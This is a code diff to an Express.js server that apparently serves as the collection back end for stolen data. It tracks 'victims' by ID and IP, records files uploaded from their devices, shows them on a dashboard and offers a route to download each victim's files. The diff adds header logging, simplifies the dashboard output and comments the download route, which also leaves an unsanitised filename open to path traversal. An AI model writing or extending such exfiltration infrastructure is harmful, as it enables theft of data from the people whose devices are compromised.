@@ -16,6 +16,12 @@ const corsOptions = {
 };
 app.use(cors(corsOptions));
 
+// Log all incoming requests for debugging
+app.use((req, res, next) => {
+  console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
+  next();
+});
+
 // Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
@@ -140,28 +146,7 @@ app.post('/upload', (req, res) => {
 
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
-  const devicesData = Object.entries(connectedDevices).map(([victimId, device]) => {
-    const fileDetails = device.fileList.map(file => {
-      const transferTime = device.fileDurations[file] || 'N/A';
-      return {
-        fileName: file,
-        transferTime: transferTime,
-        endTime: device.fileEndTimes[file] ? `${device.fileEndTimes[file][0]}s ${device.fileEndTimes[file][1] / 1e6}ms` : 'N/A'
-      };
-    });
-
-    return {
-      victimId,
-      ip: device.ip,
-      connectionTime: new Date(device.connectionTime).toLocaleString(),
-      lastConnectionTime: new Date(device.lastConnectionTime).toLocaleString(),
-      totalUploadTime: device.totalUploadTime ? `${device.totalUploadTime} seconds` : 'N/A',
-      fileList: fileDetails,
-      totalFiles: device.fileList.length,
-    };
-  });
-
-  res.json(devicesData);
+  res.json(connectedDevices);
 });
 
 // Route to download files
@@ -169,6 +154,7 @@ app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
 
+    // Check if victim folder exists first
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
@@ -176,6 +162,7 @@ app.get('/download/:victimId/:filename', (req, res) => {
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
 
+    // Check if the file exists in the folder
     if (!fs.existsSync(filePath)) {
       console.log(`❌ File not found at ${filePath}`);
       return res.status(404).json({ error: 'File not found' });
@@ -183,6 +170,7 @@ app.get('/download/:victimId/:filename', (req, res) => {
 
     console.log(`📂 Downloading file from: ${filePath}`);
     
+    // Proceed to download the file
     res.download(filePath, filename, (err) => {
       if (err) {
         console.error(`❌ Error sending file:`, err);
